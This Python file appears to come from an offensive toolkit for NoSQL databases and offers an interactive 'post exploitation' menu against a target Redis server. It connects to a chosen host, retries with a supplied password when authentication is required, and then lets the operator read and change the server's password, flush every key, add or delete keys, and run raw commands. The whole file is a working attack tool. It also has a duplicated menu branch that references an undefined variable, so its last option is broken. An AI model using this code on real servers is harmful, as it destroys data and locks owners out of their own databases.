from __future__ import print_function
from __future__ import absolute_import
# Future platform for post based Attacks


import sys
from .redisattacks import redis_conn, redis_enum
from .couchattacks import couch_conn
from termcolor import colored

# def post_couch():


def post_redis():
    target = raw_input("Enter target\n")
    r_server = redis_conn(target, 6379)
    try:
        shit = r_server.keys()
    except:
        print(colored("[+] Authentication Required \n", 'red'))
        print(
            colored("[+] Enter DB password to perform post attacks \n", 'blue'))
        password = raw_input()
        try:
            r_server.execute_command('AUTH', password)
        except Exception as e:
            print(colored("[+] "+str(e), 'red'))
            sys.exit(0)
    print(colored("[+] Perform Post Exploitation Redis Operations \n", 'green'))
    print(colored("[+] 1)List Keys & Clients Connected \n[+] 2)Add Key \n[+] 3)Delete Keys or Flush Entire DB \n[+] 4)Change Password \n[+] 5)Execute Client commands \n", 'green'))
    choice = input()
    if choice == 1:
        print(colored("[+] Clients Connected %s " %
                      (r_server.client_list()[0]['addr'])))
        redis_enum(r_server)
    elif choice == 2:
        print(colored("[-] Enter Key name and data", 'yellow'))
        key = raw_input("Key\n")
        data = raw_input("Data \n")
        try:
            r_server.set(key, data)
            print(colored("[-] %s:%s added" % (key, data), 'blue'))
        except:
            print(colored("Error occured", 'red'))
    elif choice == 3:
        print(
            colored("[+] a)Flush DB \n[+] b)Delete Key \n[-] Enter choice (a/b)", 'blue'))
        ch = raw_input()
        if ch == 'b':
            print(colored("[+] Enter the Key value to delete \n", 'yellow'))
            key = raw_input()
            if r_server.delete(key) == 1:
                print(colored("[+] Key %s deleted \n" % (key), 'blue'))
            else:
                print(colored("[+] Key %s Doesnt Exist  \n" % (key), 'red'))
        else:
            print("[+] Flushed All Database Keys \n")
            r_server.flushall()
    elif choice == 4:
        print(colored("[-] Current Password %s \n" %
                      (r_server.config_get()['requirepass']), 'green'))
        print(colored("[+] Enter new password \n", 'green'))
        password = raw_input()
        r_server.config_set('requirepass', password)
        print(colored("Password Successfully set to %s" %
                      (r_server.config_get()['requirepass']), 'green'))
    elif choice == 4:
        print(colored("Execute client Commands\n eg:FLUSHDB,ECHO,AUTH,", 'blue'))
        r_server.execute_command(command)


post_redis()
